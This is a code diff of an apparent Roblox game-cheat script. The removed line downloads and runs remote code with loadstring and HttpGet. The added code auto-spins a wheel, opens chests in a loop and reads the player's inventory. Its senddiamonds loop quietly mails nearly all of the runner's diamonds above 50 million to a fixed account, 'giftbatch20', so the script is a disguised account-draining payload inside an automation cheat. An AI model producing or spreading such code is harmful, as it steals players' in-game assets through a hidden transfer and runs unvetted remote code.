@@ -1,1 +1,170 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Pa1nx/System/main/Adoptme"))()
+
+
+
+
+
+
+if game.PlaceId ~= 17503543197 then
+    while true do
+        game.ReplicatedStorage.Network.World3Teleport:InvokeServer()
+        wait(5)
+    end
+end
+
+local function MonitorAndSpin()
+    while true do
+
+        wait()
+        repeat wait() until workspace:FindFirstChild("Map3")
+        local map3 = workspace:FindFirstChild("Map3")
+
+        repeat wait() until map3:FindFirstChild("200 | Void Spawn")
+        local voidSpawn = map3:FindFirstChild("200 | Void Spawn")
+
+        repeat wait() until voidSpawn:FindFirstChild("INTERACT")
+        local interact = voidSpawn:FindFirstChild("INTERACT")
+
+        repeat wait() until interact:FindFirstChild("Machines")
+        local machines = interact:FindFirstChild("Machines")
+
+        repeat wait() until machines:FindFirstChild("SpinnyWheel")
+        local spinnyWheel = machines:FindFirstChild("SpinnyWheel")
+
+        repeat wait() until spinnyWheel:FindFirstChild("SpinnyWheel")
+        local spinnyWheelInstance = spinnyWheel:FindFirstChild("SpinnyWheel")
+
+        repeat wait() until spinnyWheelInstance:FindFirstChild("SurfaceGui")
+        local surfaceGui = spinnyWheelInstance:FindFirstChild("SurfaceGui")
+
+        repeat wait() until surfaceGui:FindFirstChild("Wheel")
+        local wheel = surfaceGui:FindFirstChild("Wheel")
+
+        repeat wait() until wheel:FindFirstChild("WheelCore")
+        local wheelCore = wheel:FindFirstChild("WheelCore")
+
+for _, child in pairs(wheelCore:GetChildren()) do
+            if child:IsA("Frame") and child.Name ~= "Line" then
+                if child:FindFirstChild("PrizeRender") and child.PrizeRender.Icon.Image == "rbxassetid://15058306840" then
+                    local args = { [1] = "VoidWheel" }
+                    game:GetService("ReplicatedStorage").Network:FindFirstChild("Spinny Wheel: Request Spin"):InvokeServer(unpack(args))
+                end
+            end
+        end
+    end
+end
+
+spawn(MonitorAndSpin)
+local function chest()
+    while true do
+        wait(0.1)
+        
+        local args1 = {
+            [1] = "Rainbow Mini Chest"
+        }
+        game:GetService("ReplicatedStorage").Network.GiftBag_Open:InvokeServer(unpack(args1))
+
+        local args2 = {
+            [1] = "Large Gift Bag"
+        }
+        game:GetService("ReplicatedStorage").Network.GiftBag_Open:InvokeServer(unpack(args2))
+
+        local args5 = {
+            [1] = "Mini Chest"
+        }
+        game:GetService("ReplicatedStorage").Network.GiftBag_Open:InvokeServer(unpack(args5))
+        
+        local args3 = {
+            [1] = "Gift Bag"
+        }
+        game:GetService("ReplicatedStorage").Network.GiftBag_Open:InvokeServer(unpack(args3))
+    end
+end
+
+spawn(chest)
+
+local SendAmount = false
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Client = require(ReplicatedStorage:WaitForChild("Library"))
+
+local request = (syn and syn.request) or request or (http and http.request) or http_request
+
+local ItemTable = {"Diamonds"}
+local ItemVoid = {"Void Spinny Wheel Ticket"}
+
+local VoidAmount = 0
+local DiamondsID = 0
+local DiamondsAmount = 0
+
+local function GetItemInfo(ItemsClass, ItemsName)
+    local Table = {}
+    for UID, Item in pairs(require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory[ItemsClass]) do
+        if table.find(ItemsName, Item.id) then
+            local ItemInfo = {
+                ["uid"] = UID,
+                ["data"] = Item
+            }
+            table.insert(Table, ItemInfo)
+        end
+    end
+    return Table
+end
+
+local function PrintDiamonds()
+    while true do
+        local CurrencyItems = GetItemInfo("Currency", ItemTable)
+        for _, ItemInfo in pairs(CurrencyItems) do
+            local ItemData = ItemInfo.data
+            if ItemData._am and ItemData.id == "Diamonds" then
+                DiamondsID = ItemInfo.uid
+                DiamondsAmount = ItemData._am
+            end
+        end
+
+        local MiscItems = GetItemInfo("Misc", ItemVoid)
+        for _, ItemInfo in pairs(MiscItems) do
+            local ItemData = ItemInfo.data
+            if ItemData._am and ItemData.id == "Void Spinny Wheel Ticket" then
+                VoidAmount = ItemData._am
+            end
+        end
+
+        wait(0.3)  -- Update interval for checking items
+    end
+end
+
+spawn(PrintDiamonds)
+
+
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+local placeId = game.PlaceId
+local jobId = game.JobId
+
+local function rejoinServer()
+    TeleportService:TeleportToPlaceInstance(placeId, jobId, player)
+end
+
+local function senddiamonds()
+while true do
+if DiamondsAmount > 50000000 then
+local args = {
+            [1] = "giftbatch20",
+            [2] = "best gang",
+            [3] = "Currency",
+            [4] = DiamondsID,
+            [5] = DiamondsAmount - 100000
+        }
+        ReplicatedStorage.Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+        
+end
+wait(1)
+end
+end
+spawn(senddiamonds)
+
+wait(10)
+rejoinServer()
